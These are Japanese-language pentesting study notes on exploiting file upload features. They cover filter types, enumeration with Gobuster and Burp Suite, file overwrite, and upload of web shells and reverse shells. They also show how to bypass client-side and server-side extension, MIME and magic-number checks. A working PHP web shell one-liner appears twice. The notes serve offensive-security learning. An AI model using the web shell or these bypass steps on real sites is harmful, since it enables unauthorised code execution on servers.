## フィルタリングの種類

file type filtering: 

- mime validation: Content-Typeヘッダーでのフィルタ
-  **magic number** validation: ファイルコンテンツの先頭にある、コンテンツを識別するためのバイト列のこと。ただの拡張子の判断より正確。

file length filtering: 

- 小さなファイルサイズのアップロードが予測されるフォームでは、巨大なサイズのファイルがアップロードされないようになってる

file name filtering: 

- 同じ名前のファイルがすでにサーバーに存在するかどうかをチェックし、存在する場合はユーザーにエラーを表示。
- アップロード時にサニタイズされる。
- アップロードされたファイルがアップロード前に付けた名前から変更されている可能性が高い（無意味な文字列など）ので、ターゲットのWebシェルを獲得できたら、ファイルの中身が変更されていないことを確認する必要があるかもしれない。

## 一般的な方法論

### Enumeration

- ページのソースコードを確認し、クライアントサイドのフィルタを特定
- エラーメッセージを利用してサーバーサイドのフィルタを特定（拡張子のブルートフォースなど）
- Gobusterでアップロードされたファイルの保存先を特定する
- Burp Suiteでアップロードリクエストをキャプチャし、パラメータを調査

### Exploit

#### ファイルの上書き攻撃

- たとえばページのソースコードを見ると、`<image class='uploadImg' src='images/spaniel.jpg'>`というコードがあるとする。
- 画像は`images`ディレクトリの`spaniel.jpg`というファイルから取得されていることがわかる。
- 攻撃者側で適当な画像に同じく`spaniel.jpg`という名前をつけて、ファイルをアップロードしてファイルの上書きを試す

#### WebShellによるRCE

- Webサイトのバックエンドと同じ言語（またはサーバーが理解し実行できる他の言語）で書かれたプログラムをアップロードすることで悪用する

1. Gobusterでファイルアップロード先のディレクトリを明らかにする
2. 使用されている言語でwebshellのファイルを作成する。
```php
<?php echo system($_GET["cmd"]); ?>
```
3. ファイルをアップロードし、アップロード先のパス上で、`?cmd=`のあとに任意のコマンドを入力

#### Reverse shellアップロードによるRCE

1. Gobusterでファイルアップロード先のディレクトリを明らかにする
2. リバースシェルのペイロードをアップロードする
	- (`/usr/share/webshell/php/php-reverse-shell.php`など)
3. リスナーを立て、アップロード先のパスにアクセスしてシェルスクリプトの実行をし、リバースシェル獲得

## クライアントサイドフィルタリングのバイパス


- クライアントサイドフィルタは`if(file.type != "image/jpeg)"`のようなJavaScriptコードで、HTTPリクエストに記載されている

#### ブラウザでJavaScriptを無効にする方法

- javascriptが動作に必要ではないサイトで有効。クライアントサイドのフィルタリングを完全にバイパスできる
	- （javascriptを切ると動作しなくなるサイトでは使えないので他の方法へ）

- Google Chrome設定->プライバシーとセキュリティ->サイトの設定->JavaScriptで設定可

#### JavaScriptフィルタが実行される前にフィルタを除去する方法

1. サイトのソースコードをチェックし、クライアントサイドフィルタリングを確認
2. 正規のファイル送信をして、そのリクエストに対するレスポンスをBurpでキャプチャする。
3. フィルタを削除してforward 

###### ⚠️注意

- Burp Suiteは、デフォルト設定ではWebページがロードしている外部Javascriptファイルをキャプチャしない。
- ブラウザがJSファイルをキャッシュしていると、JSがレスポンスに表示されないので、`Shift+更新ボタン`で「キャッシュ消去リロード」する こと

#### Burp Suiteでファイルアップロードのリクエストを傍受して変更する方法

1. まずはJSのコードからフィルタを判別する
2. アップロードするファイルの拡張子を、一時的にフィルタリング通過できる拡張子に変更する（例：shell.php→ shell.jpeg)
3. Burp Suiteのinterceptionで変更したファイルのアップロードリクエストをキャプチャする
4. 自分が変更したファイルネームの拡張子を`content desposition`の`filename`にて本来のファイルの拡張子に変更し(jpeg→php)、`content-type`(mime)を自身が送信したいファイルのmimeタイプに変更し、forward。(phpの場合は`text/x-php`)
5. 攻撃者側にリスナーを立て、アップロードしたファイルがあるディレクトリからアップロードしたシェルを実行する。

#### フィルタを回避するために`curl`コマンドで直接ファイルを送る

- JSのフィルタはブラウザで動作するので、curlを使えばフィルタの影響を受けない可能性が高い

1. まずは正規のファイルアップロードを行い、Burpでキャプチャして、パラメタの情報収集をする
2. curlを実行する
```zsh
curl -X POST -F "submit:<value>" -F "<file-parameter>:@<path/to/file>" http://example.com/upload
```
	（`-F`はフォームデータを送信するオプション）

## サーバサイドフィルタリングのバイパス

- サーバサイドのフィルタを回避する鍵は、何が許可され、何がブロックされているかを列挙して確認し、フィルタが求める基準をパスできるペイロードを作成すること

- 💡ファイルが2回アップロードされたときに何が起こるかを**必ず**確認すること。
	- もしファイルが既に存在することを示せば、この方法を用いてWebサーバの内容をブルートフォースできる。
	- もしエラーメッセージを表示すれば、使用されているテクノロジースタックがわかる。

#### file extensions filter bypass

1. さまざまな拡張子のファイルをアップロードし、==エラーメッセージやそのメッセージが表示されるソースコードに着目==。どれがフィルタを通過するか判別する
2. 方法として、ファイルの拡張子の別名を下記リンクなどから検索しする。
	- 拡張子の別名：[PayloadAllTheThings Extension lst](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)
	- 拡張子の別名リストをBurp SuiteのIntruderを使用してブルートフォース

#### magic numbers filter bypass

- 🚨phpベースのwebサーバ以外では失敗する可能性が高い

1. file extentiosnsのバイパスと同じく、どのファイル拡張子がフィルタを通過するか確かめる。
2. [List of file signatures](https://en.wikipedia.org/wiki/List_of_file_signatures)　に、拡張子ごとのマジックナンバー("Hex signature")が載っている。ステップ1でフィルタをパスしたファイル拡張子のhexをメモしておく
3. 悪意あるファイルのファイルタイプを確認する
```zsh
file exploit.php
# php
```

4. シェルのファイルの先頭に適当な文字を入れてセーブ(AAAAとか)
```php
AAAA
<?php echo system($_GET["cmd"]); ?>
```

5. 以下のコマンドで先頭のmagic numberを編集しする(41 = A)
```zsh
hexeditor [file]
```

6. もう一度、ファイルタイプを閲覧し、変更されていることを確認する
```zsh
file exploit.php
# jpeg
```
